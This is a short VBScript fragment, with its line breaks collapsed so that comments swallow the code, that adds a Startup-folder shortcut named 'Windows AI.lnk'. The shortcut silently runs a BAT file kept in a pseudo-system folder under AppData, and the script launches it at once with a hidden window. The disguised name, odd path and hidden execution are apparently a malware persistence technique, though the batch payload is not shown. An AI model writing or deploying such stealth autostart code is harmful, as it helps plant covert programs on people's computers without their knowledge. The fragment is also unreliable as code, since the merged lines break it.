' Create a FileSystemObjectSet objFSO = CreateObject("Scripting.FileSystemObject")' Get the user's profile directorySet objShell = CreateObject("WScript.Shell")userProfileDir = objShell.ExpandEnvironmentStrings("%USERPROFILE%")' Create a shortcut in the Startup folder to run a BAT file silentlystartupFolder = objShell.SpecialFolders("Startup")shortcutPath = startupFolder & "\Windows AI.lnk"  ' Change "MyStartupScript.lnk" to your desired shortcut nameSet objShellLink = objShell.CreateShortcut(shortcutPath)batFilePath = userProfileDir & "\AppData\System\BN.bat"  ' Specify the path to your BAT fileobjShellLink.TargetPath = "cmd.exe"objShellLink.Arguments = "/c " & """" & batFilePath & """"objShellLink.WindowStyle = 7  ' Minimized windowobjShellLink.Save' Run the BAT file via the shortcutobjShell.Run """" & shortcutPath & """", 0, True